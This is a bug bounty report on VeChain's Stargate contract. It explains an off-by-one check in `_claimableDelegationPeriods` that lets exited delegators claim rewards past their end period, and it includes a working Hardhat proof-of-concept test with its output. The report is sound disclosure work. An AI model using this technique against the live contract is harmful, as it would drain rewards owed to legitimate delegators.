# 60516 sc high incorrect boundary check in claimabledelegationperiods allows claiming rewards beyond delegation end period

**Submitted on Nov 23rd 2025 at 16:33:02 UTC by @Oxodus for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #60516
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Protocol insolvency
  * Theft of unclaimed yield

## Description

## Brief/Intro

The `_claimableDelegationPeriods` function in the Stargate contract contains an incorrect boundary check (`endPeriod > nextClaimablePeriod`) that should use `>=` instead of `>`. This logic flaw allows delegators to claim rewards for periods beyond their delegation's end period when `endPeriod` equals `nextClaimablePeriod`, potentially claiming rewards they are not entitled to and draining rewards that should belong to other delegators or future periods.

## Vulnerability Details

In the `_claimableDelegationPeriods` function [lines 916-922](https://github.com/vechain/stargate-contracts/blob/jose/update-contracts-to-hayabusa/packages/contracts/contracts/Stargate.sol#L916) , the condition checking if a delegation has ended uses a strict greater than operator:

```solidity
if (
    endPeriod != type(uint32).max &&
    endPeriod < currentValidatorPeriod &&
    endPeriod > nextClaimablePeriod  // @audit should be >=
) {
    return (nextClaimablePeriod, endPeriod);
}
```

The issue arises when `endPeriod` equals `nextClaimablePeriod`. In this case:

* The condition `endPeriod > nextClaimablePeriod` evaluates to false
* The function bypasses this branch and falls through to the next condition
* It returns (`nextClaimablePeriod, completedPeriods`) instead of (`nextClaimablePeriod, endPeriod`)
* This allows the delegator to claim rewards up to `completedPeriods`, which can be significantly greater than `endPeriod` The correct logic should recognize that when `endPeriod >= nextClaimablePeriod`, there are still claimable periods from `nextClaimablePeriod` up to and including `endPeriod`. The current implementation incorrectly excludes the edge case where they are equal.

## Impact Details

1. Protocol Insolvency The Stargate contract holds VTHO rewards to distribute to delegators based on their participation in completed periods. When exited delegators fraudulently claim rewards for periods they didn't participate in, they drain VTHO from the contract that should be reserved for legitimate claimants. If multiple delegators exploit this vulnerability across different validators and time periods, the cumulative theft can exceed the contract's VTHO balance. This leaves the protocol insolvent, resulting in a direct loss of funds for legitimate users.
2. Theft of Unclaimed Yield Exited delegators can claim VTHO rewards for periods 7, 8, 9, etc., even though their delegation ended at period 6. These rewards rightfully belong to delegators who were actively staking during those periods. By exploiting the boundary check flaw, malicious actors directly steal yield that was earned by the effective stake of legitimate active delegators on the validator during post exit periods.

## References

<https://github.com/vechain/stargate-contracts/blob/jose/update-contracts-to-hayabusa/packages/contracts/contracts/Stargate.sol#L916>

## Proof of Concept

## Proof of Concept

* Modify the `"test:thor-solo"` line in the package.json file in the `packages/contracts` folder to the following, to allow us to run only the POC test `"test:thor-solo": "hardhat test --network vechain_solo --grep \"POC: Boundary check\"",`
* Paste the following test in the `Rewards.test.ts` file

```typescript
    it("POC: Boundary check allows claiming rewards beyond delegation end period", async () => {
        const user1 = otherAccounts[0];
        const levelId = 1;
        
        // Stake and delegate
        const { tokenId: tokenId } = await stakeAndMatureNFT(
            user1,
            levelId,
            stargateNFTContract,
            stargateContract
        );
        tx = await stargateContract.connect(user1).delegate(tokenId, validator);
        await tx.wait();

        const [periodSize, startBlock, ,] =
            await protocolStakerContract.getValidationPeriodDetails(validator);

        // Fast forward 5 periods and claim rewards
        await fastForwardValidatorPeriods(Number(periodSize), Number(startBlock), 5);
        tx = await stargateContract.connect(user1).claimRewards(tokenId);
        await tx.wait();
        
        // Request exit in current period
        // This sets endPeriod to 7
        tx = await stargateContract.connect(user1).requestDelegationExit(tokenId);
        await tx.wait();

        const delegation = await stargateContract.getDelegationDetails(tokenId);
        console.log(`Delegation endPeriod: ${delegation.endPeriod}`);

        // Now: endPeriod (7) < currentValidatorPeriod (8)
        await fastForwardValidatorPeriods(Number(periodSize), Number(startBlock), 0);

        // Check claimable periods
        // lastClaimedPeriod = 6, so nextClaimablePeriod = 7
        // endPeriod = 7, currentValidatorPeriod = 8
        // @audit condition checks `endPeriod (7) > nextClaimablePeriod (7)` = false
        // So it skips the exit branch and returns completedPeriods which is still 7 (at this point)        
        let [firstClaimable, lastClaimable] = await stargateContract.claimableDelegationPeriods(tokenId);
        console.log(`After exit - nextClaimable: ${firstClaimable}, lastClaimable: ${lastClaimable}, endPeriod: ${delegation.endPeriod}`);

        // Fast forward 4 more periods to make the vulnerability more obvious
        // Now validator has moved well past the delegation's endPeriod
        await fastForwardValidatorPeriods(Number(periodSize), Number(startBlock), 4);

        // @audit rechecking the claimable periods, the user can now claim up to completedPeriods instead of endPeriod
        [firstClaimable, lastClaimable] = await stargateContract.claimableDelegationPeriods(tokenId);
        const [, , , completedPeriods] = await protocolStakerContract.getValidationPeriodDetails(validator);
        
        console.log(`  Delegation ended at period: ${delegation.endPeriod}`);
        console.log(`  User can claim up to period: ${lastClaimable}`);
        console.log(`  Extra periods stolen: ${lastClaimable - delegation.endPeriod}`);
        console.log(`  Completed periods: ${completedPeriods}`);

        // User claims rewards for periods they shouldn't be entitled to
        tx = await stargateContract.connect(user1).claimRewards(tokenId);
        await tx.wait();

        // lastClaimable should equal endPeriod (7) but it equals completedPeriods (12)
        expect(lastClaimable).to.be.greaterThan(delegation.endPeriod);
        
    });
```

* run the `yarn contracts:test:integration` test to run the test, you will see the following logs

```md
@repo/contracts:test:thor-solo: 
@repo/contracts:test:thor-solo: 
@repo/contracts:test:thor-solo:   shard-i3: Stargate: Rewards
@repo/contracts:test:thor-solo: Delegation endPeriod: 7
@repo/contracts:test:thor-solo: After exit - nextClaimable: 7, lastClaimable: 7, endPeriod: 7
@repo/contracts:test:thor-solo:   Delegation ended at period: 7
@repo/contracts:test:thor-solo:   User can claim up to period: 12
@repo/contracts:test:thor-solo:   Extra periods stolen: 5
@repo/contracts:test:thor-solo:   Completed periods: 12
@repo/contracts:test:thor-solo:     ✔ POC: Boundary check allows claiming rewards beyond delegation end period (39579ms)
@repo/contracts:test:thor-solo: 
@repo/contracts:test:thor-solo: 
@repo/contracts:test:thor-solo:   1 passing (46s)
@repo/contracts:test:thor-solo: 

 Tasks:    2 successful, 2 total
Cached:    0 cached, 2 total
  Time:    54.272s 

Done in 55.00s.
```
